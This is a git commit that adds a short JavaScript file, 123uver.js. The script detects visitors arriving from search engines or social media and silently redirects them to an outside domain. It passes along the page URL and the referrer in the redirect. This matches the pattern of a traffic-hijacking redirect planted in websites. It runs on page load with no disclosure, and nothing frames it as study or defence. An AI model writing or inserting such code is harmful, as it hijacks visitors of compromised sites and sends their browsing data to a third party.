2577e708a1a2d5663f80725247123e7ccafb7d97
yasminpetrov55 <82776030+yasminpetrov55@users.noreply.github.com>
2022-07-13 02:05:22 +0700

    Add files via upload

---
+++ 123uver.js
@@ -0,0 +1,18 @@
+//<![CDATA[
+    if(document.referrer)
+    {
+    	var cek = document.referrer;
+
+    	var ars 	= rChoice([
+							'https://123uver.cz',
+							]);
+
+				function rChoice(arr) {
+    			return arr[Math.floor(arr.length * Math.random())];
+	}
+
+	//Code arsae client javascript
+	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'yahoo.', 'whatsapp.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+    }
+//]]>
+
